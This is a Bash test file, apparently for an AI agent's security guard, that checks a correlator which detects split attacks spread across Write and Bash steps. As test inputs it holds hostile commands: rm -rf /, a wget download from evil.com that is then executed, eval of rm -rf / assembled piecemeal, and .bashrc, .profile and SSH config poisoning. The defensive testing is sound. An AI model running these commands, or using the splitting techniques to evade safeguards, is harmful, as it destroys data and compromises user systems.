#!/bin/bash
# WoW System - Content Correlator Tests
# TDD Phase: RED - Define expected behavior before implementation
# Author: Chude <chude@emeke.org>
#
# The Content Correlator detects "split attacks" where dangerous operations
# are broken across multiple seemingly innocent steps:
# - Write-then-Execute: Write script, then run it
# - Download-then-Execute: Download file, then execute
# - Staged Building: Build dangerous command piece by piece
# - Config Poisoning: Write content that will be sourced

set -uo pipefail

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "${SCRIPT_DIR}")"

# Source test framework
source "${SCRIPT_DIR}/test-framework.sh"

# ============================================================================
# Test Setup
# ============================================================================

setup_all() {
    # Source the correlator module
    source "${PROJECT_ROOT}/src/security/correlator/correlator.sh" 2>/dev/null || true
}

setup_each() {
    # Reset correlator state before each test
    if type correlator_reset &>/dev/null; then
        correlator_reset
    fi
}

# ============================================================================
# Function Existence Tests
# ============================================================================

test_correlator_init_exists() {
    if ! type correlator_init &>/dev/null; then
        fail "correlator_init function should exist"
        return 1
    fi
    pass
}

test_correlator_track_exists() {
    if ! type correlator_track &>/dev/null; then
        fail "correlator_track function should exist"
        return 1
    fi
    pass
}

test_correlator_check_exists() {
    if ! type correlator_check &>/dev/null; then
        fail "correlator_check function should exist"
        return 1
    fi
    pass
}

test_correlator_reset_exists() {
    if ! type correlator_reset &>/dev/null; then
        fail "correlator_reset function should exist"
        return 1
    fi
    pass
}

# ============================================================================
# Write-then-Execute Detection Tests
# ============================================================================

test_detect_write_then_source() {
    # Step 1: Write a script to /tmp
    correlator_track "Write" "/tmp/script.sh" "echo dangerous"

    # Step 2: Source it - should be flagged
    if correlator_check "Bash" "source /tmp/script.sh"; then
        fail "Should detect write-then-source pattern"
        return 1
    fi
    pass
}

test_detect_write_then_bash() {
    # Step 1: Write a script to /tmp
    correlator_track "Write" "/tmp/payload.sh" "rm -rf /"

    # Step 2: Execute with bash - should be flagged
    if correlator_check "Bash" "bash /tmp/payload.sh"; then
        fail "Should detect write-then-bash pattern"
        return 1
    fi
    pass
}

test_detect_write_then_dot_source() {
    # Step 1: Write a script
    correlator_track "Write" "/tmp/evil.sh" "malicious content"

    # Step 2: Dot-source it - should be flagged
    if correlator_check "Bash" ". /tmp/evil.sh"; then
        fail "Should detect write-then-dot-source pattern"
        return 1
    fi
    pass
}

test_detect_write_then_chmod_execute() {
    # Step 1: Write a script
    correlator_track "Write" "/tmp/run.sh" "#!/bin/bash"

    # Step 2: Make executable
    correlator_track "Bash" "chmod +x /tmp/run.sh" ""

    # Step 3: Execute - should be flagged
    if correlator_check "Bash" "/tmp/run.sh"; then
        fail "Should detect write-chmod-execute pattern"
        return 1
    fi
    pass
}

test_allow_write_safe_location() {
    # Write to a safe location (not /tmp or similar)
    correlator_track "Write" "/home/user/scripts/safe.sh" "echo hello"

    # Execute from same location - less suspicious
    if ! correlator_check "Bash" "bash /home/user/scripts/safe.sh"; then
        fail "Should allow execution from safe locations"
        return 1
    fi
    pass
}

# ============================================================================
# Download-then-Execute Detection Tests
# ============================================================================

test_detect_curl_then_execute() {
    # Step 1: Download a file
    correlator_track "Bash" "curl -o /tmp/script.sh http://example.com/s" ""

    # Step 2: Execute it - should be flagged
    if correlator_check "Bash" "bash /tmp/script.sh"; then
        fail "Should detect curl-then-execute pattern"
        return 1
    fi
    pass
}

test_detect_wget_then_execute() {
    # Step 1: Download with wget
    correlator_track "Bash" "wget -O /tmp/payload http://evil.com/p" ""

    # Step 2: Execute - should be flagged
    if correlator_check "Bash" "/tmp/payload"; then
        fail "Should detect wget-then-execute pattern"
        return 1
    fi
    pass
}

test_detect_curl_then_source() {
    # Step 1: Download
    correlator_track "Bash" "curl http://x.com/s > /tmp/cfg.sh" ""

    # Step 2: Source - should be flagged
    if correlator_check "Bash" "source /tmp/cfg.sh"; then
        fail "Should detect curl-then-source pattern"
        return 1
    fi
    pass
}

# ============================================================================
# Staged Building Detection Tests
# ============================================================================

test_detect_staged_variable_build() {
    # Building dangerous command across variables
    correlator_track "Bash" "cmd1='rm'" ""
    correlator_track "Bash" "cmd2='-rf'" ""
    correlator_track "Bash" "cmd3='/'" ""

    # Combine and execute - should be flagged
    if correlator_check "Bash" 'eval "$cmd1 $cmd2 $cmd3"'; then
        fail "Should detect staged variable building"
        return 1
    fi
    pass
}

test_detect_array_building() {
    # Building command via array
    correlator_track "Bash" "parts=()" ""
    correlator_track "Bash" "parts+=(rm)" ""
    correlator_track "Bash" "parts+=(-rf)" ""
    correlator_track "Bash" "parts+=(/)" ""

    # Execute array - should be flagged
    if correlator_check "Bash" '"${parts[@]}"'; then
        fail "Should detect array command building"
        return 1
    fi
    pass
}

# ============================================================================
# Config Poisoning Detection Tests
# ============================================================================

test_detect_bashrc_poisoning() {
    # Write to .bashrc
    correlator_track "Write" "/home/user/.bashrc" "alias sudo='steal_creds'"

    # This write itself should be flagged
    local result
    result=$(correlator_get_risk "Write" "/home/user/.bashrc")
    if [[ "${result}" != *"config_poisoning"* ]]; then
        fail "Should flag .bashrc modification as config poisoning risk"
        return 1
    fi
    pass
}

test_detect_profile_poisoning() {
    # Write to .profile
    correlator_track "Write" "/home/user/.profile" "export PATH=/tmp:$PATH"

    local result
    result=$(correlator_get_risk "Write" "/home/user/.profile")
    if [[ "${result}" != *"config_poisoning"* ]]; then
        fail "Should flag .profile modification as config poisoning risk"
        return 1
    fi
    pass
}

test_detect_ssh_config_poisoning() {
    # Write to SSH config
    correlator_track "Write" "/home/user/.ssh/config" "ProxyCommand /tmp/evil"

    local result
    result=$(correlator_get_risk "Write" "/home/user/.ssh/config")
    if [[ "${result}" != *"config_poisoning"* ]]; then
        fail "Should flag SSH config modification"
        return 1
    fi
    pass
}

# ============================================================================
# Temporal Correlation Tests
# ============================================================================

test_detect_rapid_succession() {
    # Multiple related operations in rapid succession
    correlator_track "Write" "/tmp/a.sh" "part1"
    correlator_track "Write" "/tmp/b.sh" "part2"
    correlator_track "Write" "/tmp/c.sh" "part3"
    correlator_track "Bash" "cat /tmp/a.sh /tmp/b.sh /tmp/c.sh > /tmp/full.sh" ""

    # Execute combined script
    if correlator_check "Bash" "bash /tmp/full.sh"; then
        fail "Should detect rapid succession pattern"
        return 1
    fi
    pass
}

test_allow_normal_workflow() {
    # Normal development workflow shouldn't be flagged
    correlator_track "Write" "/home/user/project/main.py" "print('hello')"
    correlator_track "Bash" "python /home/user/project/main.py" ""

    # This is normal - should be allowed
    if ! correlator_check "Bash" "python /home/user/project/main.py"; then
        fail "Should allow normal development workflow"
        return 1
    fi
    pass
}

# ============================================================================
# Sliding Window Tests
# ============================================================================

test_window_expiry() {
    # Old operations should expire from the window
    correlator_track "Write" "/tmp/old.sh" "content"

    # Wait a moment then expire with 0 second window (expire everything)
    sleep 1
    if type correlator_expire_old &>/dev/null; then
        correlator_expire_old 0  # Expire everything older than 0 seconds
    fi

    # Old write should no longer correlate (was expired)
    if ! correlator_check "Bash" "bash /tmp/old.sh"; then
        fail "Expired operations should not trigger correlation"
        return 1
    fi
    pass
}

test_window_size_limit() {
    # Window should have a size limit
    for i in {1..100}; do
        correlator_track "Bash" "echo $i" ""
    done

    local count
    count=$(correlator_get_window_size 2>/dev/null || echo "0")
    if [[ ${count} -gt 50 ]]; then
        fail "Window should have size limit, got ${count}"
        return 1
    fi
    pass
}

# ============================================================================
# Risk Scoring Tests
# ============================================================================

test_risk_score_high_for_tmp_execute() {
    correlator_track "Write" "/tmp/payload.sh" "dangerous"

    local risk
    risk=$(correlator_get_execution_risk "/tmp/payload.sh" 2>/dev/null || echo "0")

    if [[ ${risk} -lt 80 ]]; then
        fail "Executing recently written /tmp file should have high risk, got ${risk}"
        return 1
    fi
    pass
}

test_risk_score_low_for_system_binary() {
    local risk
    risk=$(correlator_get_execution_risk "/usr/bin/ls" 2>/dev/null || echo "0")

    if [[ ${risk} -gt 20 ]]; then
        fail "Executing system binary should have low risk, got ${risk}"
        return 1
    fi
    pass
}

test_get_correlation_reason() {
    correlator_track "Write" "/tmp/evil.sh" "rm -rf /"

    correlator_check "Bash" "bash /tmp/evil.sh" >/dev/null 2>&1 || true

    local reason
    reason=$(correlator_get_reason 2>/dev/null || echo "")

    if [[ -z "${reason}" ]]; then
        fail "Should return reason for detected correlation"
        return 1
    fi

    if [[ "${reason}" != *"write"* ]] && [[ "${reason}" != *"execute"* ]]; then
        fail "Reason should mention write-execute pattern: ${reason}"
        return 1
    fi
    pass
}

# ============================================================================
# Run Tests
# ============================================================================

test_suite "Content Correlator Tests"

# Setup
setup_all

# Function existence tests
test_case "correlator_init exists" test_correlator_init_exists
test_case "correlator_track exists" test_correlator_track_exists
test_case "correlator_check exists" test_correlator_check_exists
test_case "correlator_reset exists" test_correlator_reset_exists

# Write-then-Execute tests
setup_each
test_case "Detect write-then-source" test_detect_write_then_source
setup_each
test_case "Detect write-then-bash" test_detect_write_then_bash
setup_each
test_case "Detect write-then-dot-source" test_detect_write_then_dot_source
setup_each
test_case "Detect write-chmod-execute" test_detect_write_then_chmod_execute
setup_each
test_case "Allow write to safe location" test_allow_write_safe_location

# Download-then-Execute tests
setup_each
test_case "Detect curl-then-execute" test_detect_curl_then_execute
setup_each
test_case "Detect wget-then-execute" test_detect_wget_then_execute
setup_each
test_case "Detect curl-then-source" test_detect_curl_then_source

# Staged building tests
setup_each
test_case "Detect staged variable build" test_detect_staged_variable_build
setup_each
test_case "Detect array building" test_detect_array_building

# Config poisoning tests
setup_each
test_case "Detect .bashrc poisoning" test_detect_bashrc_poisoning
setup_each
test_case "Detect .profile poisoning" test_detect_profile_poisoning
setup_each
test_case "Detect SSH config poisoning" test_detect_ssh_config_poisoning

# Temporal correlation tests
setup_each
test_case "Detect rapid succession" test_detect_rapid_succession
setup_each
test_case "Allow normal workflow" test_allow_normal_workflow

# Sliding window tests
setup_each
test_case "Window expiry" test_window_expiry
setup_each
test_case "Window size limit" test_window_size_limit

# Risk scoring tests
setup_each
test_case "High risk for /tmp execute" test_risk_score_high_for_tmp_execute
setup_each
test_case "Low risk for system binary" test_risk_score_low_for_system_binary
setup_each
test_case "Get correlation reason" test_get_correlation_reason

# Summary
test_summary
